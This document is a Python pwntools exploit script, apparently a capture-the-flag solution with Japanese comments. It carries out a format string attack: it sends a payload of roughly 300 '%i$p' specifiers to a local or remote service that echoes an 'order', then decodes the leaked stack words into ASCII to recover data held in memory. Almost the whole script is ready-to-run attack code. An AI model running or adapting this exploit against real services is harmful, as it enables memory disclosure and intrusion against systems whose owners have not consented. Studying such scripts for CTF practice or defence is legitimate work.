## Run local executable.
##   ./exploit.py LOCAL EXE=./executable
#
## Run remote (with local executable for addresses)
##   ./exploit.py HOST=example.com PORT=4141 EXE=/tmp/executable
#
## Run with GDB script.
##   ./exploit.py GDB
## --- (Edit GDB script if necessary) --------------------------------
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)
## -------------------------------------------------------------------

from pwn import *

## --- (do not edit) ---------------------------------------------------
if args.EXE:
    exe = context.binary = ELF(args.EXE)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    host = args.HOST
    port = int(args.PORT)
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()
## -----------------------------------------------------------------------

## EXPLOIT GOES HERE

## 書式文字列攻撃 (スタックのリーク)

## param: printfの何番目の引数（=~ スタックポインタの何個上のワード）から、
offset = 0
## param: 何番目の引数までのアドレスを出力するか
num = 300

payload = ",".join([f"%{i}$p" for i in range(offset, offset + num)])

## param: バナー
io.sendlineafter(
    b"Give me your order and I'll read it back to you:\n",
    payload,
)

retstr = io.recvline().decode().split("Here's your order:")[-1]

## 出力されたアドレスをASCIIに変換して表示
addresses = retstr.split(",")
for address in addresses:
    if address.startswith("0x"):
        decoded = unhex(address.strip()[2:])
        reversed_hex = decoded[::-1]
        print(str(reversed_hex))

io.interactive()
io.close()

